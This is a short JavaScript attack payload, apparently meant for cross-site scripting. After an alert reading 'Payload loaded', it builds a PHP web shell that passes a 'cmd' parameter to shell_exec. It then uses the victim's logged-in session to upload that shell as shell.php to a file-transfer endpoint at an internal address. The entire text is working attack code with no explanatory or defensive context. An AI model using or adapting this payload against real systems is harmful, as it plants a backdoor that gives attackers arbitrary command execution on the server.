alert("Payload loaded");
(async () => {
  const shell = `
  <?php
  if (isset($_GET['cmd'])) {
    echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
    exit;
  }
  ?>
  <html>
  <body>
  <form method="GET">
    <input name="cmd" style="width:70%;">
    <input type="submit" value="Execute">
  </form>
  </body>
  </html>`;

  const file = new File([shell], "shell.php", { type: "application/x-php" });

  const form = new FormData();
  form.append("localfile", file);
  form.append("MAX_FILE_SIZE", "1000000");
  form.append("act", "upload");
  form.append("dir", "");
  form.append("submit", "Upload");

  await fetch("https://10.23.108.10/app/ft/ft2.php", {
    method: "POST",
    credentials: "include",
    body: form
  });
})();
